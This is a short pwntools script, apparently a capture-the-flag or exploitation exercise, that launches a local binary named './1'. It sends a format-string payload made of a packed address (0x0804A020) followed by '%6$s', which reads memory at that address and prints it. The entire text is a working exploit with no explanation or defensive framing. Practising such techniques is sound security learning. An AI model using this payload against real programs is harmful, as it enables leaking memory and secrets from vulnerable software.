from pwn import*
p = process('./1')
addr = 0x0804A020              
payload =  p32(addr)  + "%6$s"
p.sendline(payload)
print p.recvall()

